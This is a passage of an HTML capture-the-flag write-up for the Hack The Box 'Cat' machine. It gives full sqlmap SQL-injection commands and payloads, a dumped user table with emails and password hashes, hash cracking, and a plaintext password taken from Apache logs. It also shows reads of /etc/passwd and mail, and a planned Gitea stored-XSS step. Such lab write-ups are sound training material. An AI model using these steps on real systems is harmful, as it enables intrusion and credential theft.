+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    }
+    
+    70% {
+        transform: scale(1);
+        box-shadow: 0 0 0 10px rgba(159, 239, 0, 0);
+    }
+    
+    100% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0);
+    }
+}
+</style>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">cat</span> accepet_cat.req 
+POST /accept_cat.php HTTP/1.1
+Host: cat.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+Origin: http://cat.htb
+Connection: keep-alive
+Referer: http://cat.htb/admin.php
+Cookie: PHPSESSID=dfvc101c10h4bv5nihmdnkp300
+Priority: u=0
+
+catName=awdaw&catId=1   
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>We use <code>sqlmap</code> to exploit the SQL Injection vulnerability in the <code>catName</code> parameter:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sqlmap</span> <span class="flag">-r</span> accepet_cat.req <span class="flag">--batch</span> <span class="flag">-p</span> catName <span class="flag">--level</span> 5 <span class="flag">--risk</span> 3
+<span style="color:rgb(255, 153, 0);font-weight: bold">        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.4#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+</span>
+
+<span class="indicator-warning">[!]</span> legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+<span class="indicator-info">[*]</span> starting @ 11:07:26 /2025-07-05/
+
+[11:07:26] [INFO] parsing HTTP request from <span class="string">'accepet_cat.req'</span>
+[11:07:26] [INFO] resuming back-end DBMS <span class="string">'sqlite'</span> 
+[11:07:26] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+<span class="flag">---</span>
+Parameter: catName (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: catName=kayden'||(SELECT CHAR(69,121,66,110) WHERE 3182=3182 AND 5253=5253)||'&catId=1
+<span class="flag">---</span>
+[11:07:27] [INFO] the back-end DBMS is SQLite
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: SQLite
+[11:07:27] [INFO] fetched data logged to text files under <span class="string">'/home/gen/.local/share/sqlmap/output/cat.htb'</span>
+
+<span class="indicator-info">[*]</span> ending @ 11:07:27 /2025-07-05/
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Confirming the SQL Injection, we proceed to dump the database tables:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash">#  </span><span class="command">sqlmap</span> <span class="flag">-r</span> accepet_cat.req <span class="flag">--batch</span> <span class="flag">-p</span> catName <span class="flag">--level</span> 5 <span class="flag">--risk</span> 3 <span class="flag">--tables</span>
+ <span style="color:rgb(255, 153, 0);font-weight: bold">        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+</span>
+
+<span class="indicator-warning">[!]</span> legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+<span class="indicator-info">[*]</span> starting @ 11:09:16 /2025-07-05/
+
+[11:09:16] [INFO] parsing HTTP request from <span class="string">'accepet_cat.req'</span>
+[11:09:16] [INFO] resuming back-end DBMS <span class="string">'sqlite'</span>
+[11:09:16] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+<span class="flag">---</span>
+Parameter: catName (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: catName=kayden'||(SELECT CHAR(69,121,66,110) WHERE 3182=3182 AND 5253=5253)||'&catId=1
+<span class="flag">---</span>
+[11:09:16] [INFO] the back-end DBMS is SQLite
+web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: SQLite
+[11:09:16] [INFO] fetching tables for database: <span class="string">'SQLite_masterdb'</span>
+[11:09:16] [INFO] fetching number of tables for database <span class="string">'SQLite_masterdb'</span>
+[11:09:16] [INFO] resumed: 4
+[11:09:16] [INFO] resumed: accepted_cats
+[11:09:16] [INFO] resumed: sqlite_sequence
+[11:09:16] [INFO] resumed: cats
+[11:09:16] [INFO] resumed: users
+<current>
+[4 tables]
++-----------------+
+| accepted_cats   |
+| cats            |
+| sqlite_sequence |
+| users           |
++-----------------+
+
+[11:09:16] [INFO] fetched data logged to text files under <span class="string">'/home/gen/.local/share/sqlmap/output/cat.htb'</span>
+
+<span class="indicator-info">[*]</span> ending @ 11:09:16 /2025-07-05/
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The <code>users</code> table is of particular interest. We dump its contents:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sqlmap</span> <span class="flag">-r</span> accepet_cat.req <span class="flag">--batch</span> <span class="flag">-p</span> catName <span class="flag">--level</span> 5 <span class="flag">--risk</span> 3 <span class="flag">-T</span> users <span class="flag">--dump</span>
+<span style="color:rgb(255, 153, 0);font-weight: bold"> 
+         __
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+</span>
+
+<span class="indicator-warning">[!]</span> legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+<span class="indicator-info">[*]</span> starting @ 11:10:58 /2025-07-05/
+
+[11:10:58] [INFO] parsing HTTP request from <span class="string">'accepet_cat.req'</span>
+[11:10:58] [INFO] resuming back-end DBMS <span class="string">'sqlite'</span>
+[11:10:58] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+<span class="flag">---</span>
+Parameter: catName (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: catName=kayden'||(SELECT CHAR(69,121,66,110) WHERE 3182=3182 AND 5253=5253)||'&catId=1
+<span class="flag">---</span>
+[11:10:58] [INFO] the back-end DBMS is SQLite
+web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: SQLite
+...SNIP...
+Database: <current>                                                              Table: users          
+[10 entries]
+...SNIP...
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The dump reveals 10 user entries. We extract the usernames and hashes into a <code>username:password</code> format:</p>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+          <th></th>
+          <th></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>user_id</strong></td>
+          <td><strong>email</strong></td>
+          <td><strong>password</strong></td>
+          <td><strong>username</strong></td>
+      </tr>
+      <tr>
+          <td>1</td>
+          <td><a href="mailto:axel2017@gmail.com">axel2017@gmail.com</a></td>
+          <td>d1bbba3670feb9435c9841e46e60ee2f</td>
+          <td>axel</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td><a href="mailto:rosamendoza485@gmail.com">rosamendoza485@gmail.com</a></td>
+          <td>ac369922d560f17d6eeb8b2c7dec498c</td>
+          <td>rosa</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td><a href="mailto:robertcervantes2000@gmail.com">robertcervantes2000@gmail.com</a></td>
+          <td>42846631708f69c00ec0c0a8aa4a92ad</td>
+          <td>robert</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td><a href="mailto:fabiancarachure2323@gmail.com">fabiancarachure2323@gmail.com</a></td>
+          <td>39e153e825c4a3d314a0dc7f7475ddbe</td>
+          <td>fabian</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td><a href="mailto:jerrysonC343@gmail.com">jerrysonC343@gmail.com</a></td>
+          <td>781593e060f8d065cd7281c5ec5b4b86</td>
+          <td>jerryson</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td><a href="mailto:larryP5656@gmail.com">larryP5656@gmail.com</a></td>
+          <td>1b6dce240bbfbc0905a664ad199e18f8</td>
+          <td>larry</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td><a href="mailto:royer.royer2323@gmail.com">royer.royer2323@gmail.com</a></td>
+          <td>c598f6b844a36fa7836fba0835f1f6</td>
+          <td>royer</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td><a href="mailto:peterCC456@gmail.com">peterCC456@gmail.com</a></td>
+          <td>e41ccefa439fc454f7eadbf1f139ed8a</td>
+          <td>peter</td>
+      </tr>
+      <tr>
+          <td>9</td>
+          <td><a href="mailto:angel234g@gmail.com">angel234g@gmail.com</a></td>
+          <td>24a8ec003ac2e1b3c5953a6f95f8f565</td>
+          <td>angel</td>
+      </tr>
+      <tr>
+          <td>10</td>
+          <td><a href="mailto:jobert2020@gmail.com">jobert2020@gmail.com</a></td>
+          <td>88e4dceccd48820cf77b5cf6c08698ad</td>
+          <td>jobert</td>
+      </tr>
+  </tbody>
+</table>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">grep</span> <span class="flag">-E</span> <span class="string">'\|[[:space:]]*[0-9]+[[:space:]]*\|'</span> dump.txt | <span style="color: #15adff">awk</span> <span class="flag">-F</span> <span class="string">'|'</span> <span class="string">'{for(i=1;i<=NF;i++)gsub(/^[ \t]+|[ \t]+$/, <span class="string">""</span>, $i); if(NF>=5 && $5!="") print $5 <span class="string">":"</span> $4}'</span> | <span style="color: #15adff">tee</span> hashes.txt
+axel:d1bbba3670feb9435c9841e46e60ee2f
+rosa:ac369922d560f17d6eeb8b2c7dec498c
+robert:42846631708f69c00ec0c0a8aa4a92ad
+fabian:39e153e825c4a3d314a0dc7f7475ddbe
+jerryson:781593e060f8d065cd7281c5ec5b4b86
+larry:1b6dce240bbfbc0905a664ad199e18f8
+royer:c598f6b844a36fa7836fba0835f1f6
+peter:e41ccefa439fc454f7eadbf1f139ed8a
+angel:24a8ec003ac2e1b3c5953a6f95f8f565
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>We extract only the hashes to use with an online cracker like <a href="https://crackstation.net/">CrackStation</a>.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">cat</span> hashes.txt | <span style="color: #15adff">awk</span> <span class="flag">-F</span>: <span class="string">'{print $2}'</span>
+d1bbba3670feb9435c9841e46e60ee2f
+ac369922d560f17d6eeb8b2c7dec498c
+42846631708f69c00ec0c0a8aa4a92ad
+39e153e825c4a3d314a0dc7f7475ddbe
+781593e060f8d065cd7281c5ec5b4b86
+1b6dce240bbfbc0905a664ad199e18f8
+c598f6b844a36fa7836fba0835f1f6
+e41ccefa439fc454f7eadbf1f139ed8a
+24a8ec003ac2e1b3c5953a6f95f8f565
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Submitting these hashes to CrackStation, we find one cracked password:</p>
+<img src="/img/cat/crackstation.png" alt="" class="img-responsive" loading="lazy" />
+<p>We identify the user associated with the cracked hash:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">cat</span> hashes.txt| <span style="color: #15adff">grep</span> ac369922d560f17d6eeb8b2c7dec498c
+rosa:ac369922d560f17d6eeb8b2c7dec498c
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The cracked password belongs to <code>rosa</code>. We attempt to SSH into the box as <code>rosa</code>:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ssh</span> rosa@cat.htb 
+The authenticity of host <span class="string">'cat.htb (10.10.11.53)'</span> can't be established.
+ED25519 key fingerprint is SHA256:tsmOV3JuQkCv6HNUqg9YQ+DJznLS2nYKJl4zIwKtbE4.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:22: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added <span class="string">'cat.htb'</span> (ED25519) to the list of known hosts.
+rosa@cat.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat 05 Jul 2025 03:31:27 PM UTC
+
+  System load:           0.01
+  Usage of /:            51.9% of 6.06GB
+  Memory usage:          16%
+  Swap usage:            0%
+  Processes:             236
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.53
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:bb1a
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sat Sep 28 15:44:52 2024 from 192.168.1.64
+<span style="color:#9dff00;font-weight: bold;">rosa@cat</span>:~$ 
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>We have successfully gained SSH access as <code>rosa</code>.</p>
+<hr>
+<h1 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h1>
+<p>Upon logging in as <code>rosa</code>, we check the user&rsquo;s group memberships using the <code>id</code> command:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:#9dff00;font-weight: bold;">rosa@cat</span><span style="color:white">:</span><span style="color: #3b4df1">~</span>$ id
+uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The <code>rosa</code> user is part of the <code>adm</code> group. This group typically has permissions to read system log files and other administrative files. Since Apache is running on the server, we check its access logs for interesting information:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:#9dff00;font-weight: bold;">rosa@cat</span>:<span style="color: #3b4df1">~</span>$ head <span class="flag">-5</span> /var/log/apache2/access.log
+127.0.0.1 - - [05/Jul/2025:15:04:49 +0000] <span class="string">"GET /join.php HTTP/1.1"</span> 200 1683 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"</span>
+127.0.0.1 - - [05/Jul/2025:15:04:49 +0000] <span class="string">"GET /css/styles.css HTTP/1.1"</span> 200 1155 <span class="string">"http://cat.htb/join.php"</span> <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"</span>
+127.0.0.1 - - [05/Jul/2025:15:04:49 +0000] <span class="string">"GET /favicon.ico HTTP/1.1"</span> 404 485 <span class="string">"http://cat.htb/join.php"</span> <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"</span>
+127.0.0.1 - - [05/Jul/2025:15:04:50 +0000] <span class="string">"GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1"</span> 302 329 <span class="string">"http://cat.htb/join.php"</span> <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"</span>
+127.0.0.1 - - [05/Jul/2025:15:04:50 +0000] <span class="string">"GET / HTTP/1.1"</span> 200 1436 <span class="string">"http://cat.htb/join.php"</span> <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"</span>
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The logs show a login attempt by user <code>axel</code> with a password. We check if <code>axel</code> is a system user.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:#9dff00;font-weight: bold;">rosa@cat</span>:<span style="color: #3b4df1">~</span>$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/ba<span style="color:rgb(255, 21, 21)">sh</span>
+axel:x:1000:1000:axel:/home/axel:/bin/ba<span style="color:rgb(255, 21, 21)">sh</span>
+rosa:x:1001:1001:,,,:/home/rosa:/bin/ba<span style="color:rgb(255, 21, 21)">sh</span>
+git:x:114:119:Git Version Control,,,:/home/git:/bin/ba<span style="color:rgb(255, 21, 21)">sh</span>
+jobert:x:1002:1002:,,,:/home/jobert:/bin/ba<span style="color:rgb(255, 21, 21)">sh</span>
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>User <code>axel</code> exists. We attempt to switch user to <code>axel</code> using the password found in the logs.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:#9dff00;font-weight: bold;">rosa@cat</span>:<span style="color: #3b4df1">~</span>$ su - axel
+Password: 
+<span style="color:#9dff00;font-weight: bold;">axel@cat</span>:<span style="color: #3b4df1">~</span>$ cat user.txt 
+fa36b2c0a19c890b16baae817657e4b8
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+User flag: fa36b2c0a19c890b16baae817657e4b8
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+<hr>
+<h1 id="privilege-escalation-to-root">Privilege Escalation to Root<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation-to-root">#</a></h1>
+<p>From the <code>/etc/passwd</code> file, we noticed a <code>git</code> user, which suggests a local Git hosting service. We check the listening ports on the server.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:#9dff00;font-weight: bold;">axel@cat</span>:<span style="color: #3b4df1">~</span>$ ss <span class="flag">-lntp</span>
+State      Recv-Q Send-Q  Local Address:Port       Peer Address:Port    Process
+LISTEN     0      10      127.0.0.1:587            0.0.0.0:*           
+LISTEN     0      37      127.0.0.1:55923          0.0.0.0:*           
+LISTEN     0      4096    127.0.0.53%lo:53         0.0.0.0:*           
+LISTEN     0      128     0.0.0.0:22               0.0.0.0:*           
+LISTEN     0      1       127.0.0.1:36727          0.0.0.0:*           
+LISTEN     0      128     127.0.0.1:48983          0.0.0.0:*           
+LISTEN     0      4096    127.0.0.1:3000           0.0.0.0:*           
+LISTEN     0      10      127.0.0.1:25             0.0.0.0:*           
+LISTEN     0      511     *:80                     *:*                 
+LISTEN     0      128     [::]:22                  [::]:*              
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Port <code>3000</code> is listening locally, which is a common port for Gitea. Port <code>25</code> (SMTP) is also open. When we SSH as <code>axel</code>, we notice a mail notification.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ssh</span> axel@cat.htb 
+axel@cat.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
+
+...SNIP...
+
+You have mail.
+Last login: Fri Jan 31 11:31:57 2025 from 10.10.14.69
+<span style="color:#9dff00;font-weight: bold;">axel@cat</span>:<span style="color: #3b4df1">~</span>$
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Reading <code>axel</code>&rsquo;s mail reveals details about an internal Gitea service running on <code>localhost:3000</code>.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span style="color:#9dff00;font-weight: bold;">axel@cat</span>:<span style="color: #3b4df1">~</span>$ cat /var/mail/axel 
+From rosa@cat.htb  Sat Sep 28 04:51:50 2024
+Return-Path: <rosa@cat.htb>
+Received: from cat.htb (localhost [127.0.0.1])
+        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
+        for <axel@cat.htb>; Sat, 28 Sep 2024 04:51:50 GMT
+Received: (from rosa@localhost)
+        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
+        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
+Date: Sat, 28 Sep 2024 04:51:49 GMT
+From: rosa@cat.htb
+Message-Id: <202409280451.48S4pnlT001591@cat.htb>
+Subject: New cat services
+
+Hi Axel,
+
+We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.
+
+Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.
+
+From rosa@cat.htb  Sat Sep 28 05:05:28 2024
+Return-Path: <rosa@cat.htb>
+Received: from cat.htb (localhost [127.0.0.1])
+        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
+        for <axel@cat.htb>; Sat, 28 Sep 2024 05:05:28 GMT
+Received: (from rosa@localhost)
+        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
+        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
+Date: Sat, 28 Sep 2024 05:05:28 GMT
+From: rosa@cat.htb
+Message-Id: <202409280505.48S55Sm0002267@cat.htb>
+Subject: Employee management
+
+We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The mail indicates that <code>jobert@localhost</code> will review a Gitea repository, and provides a link to an &ldquo;Employee management&rdquo; repository: <code>http://localhost:3000/administrator/Employee-management/</code>.</p>
+<p>We forward port <code>3000</code> from the target to our local machine via SSH.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ssh</span> <span class="flag">-L</span> 3000:127.0.0.1:3000 axel@cat.htb
+axel@cat.htb's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
+...SNIP...
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+
+<div class="ctf-bullet-list">
+    <ul>
+<li>
+<p>Now, we can access <code>http://localhost:3000</code> in our browser. The Gitea instance shows three users when exploring.<br>
+<img src="/img/cat/git_users.png" alt="" class="img-responsive" loading="lazy" /></p>
+</li>
+<li>
+<p>Logging in as <code>axel</code> with his password, we notice the Gitea version is <code>1.22.0</code> in the footer.<br>
+<img src="/img/cat/git_footer.png" alt="" class="img-responsive" loading="lazy" /></p>
+</li>
+<li>
+<p>Searching for exploits for <code>Gitea 1.22.0</code>, we find a <code>Stored XSS</code> vulnerability.<br>
+<img src="/img/cat/stored_xss.png" alt="" class="img-responsive" loading="lazy" /></p>
+</li>
+<li>
+<p>The XSS vulnerability can be exploited by injecting a payload into the repository description. We aim to extract the <code>index.php</code> file from the <code>Employee-management</code> repository, as the email suggested <code>jobert</code> would review the repository.</p>
+</li>
+</ul>
+
+</div>
+
+<style>
+.ctf-bullet-list ul {
+    list-style: none;
+    padding-left: 0;
+    margin: 16px 0;
+}
+
+.ctf-bullet-list li {
+    position: relative;
+    padding-left: 32px;
+    margin-bottom: 20px;
+}
+
+.ctf-bullet-list li::before {
+    content: '';
+    position: absolute;
+    left: 4px;
+    top: 6px;
+    width: 12px;
+    height: 12px;
+    background-color: #9fef00;
+    border-radius: 50%;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+    z-index: 2;
+}
+
+.ctf-bullet-list li::after {
+    content: '';
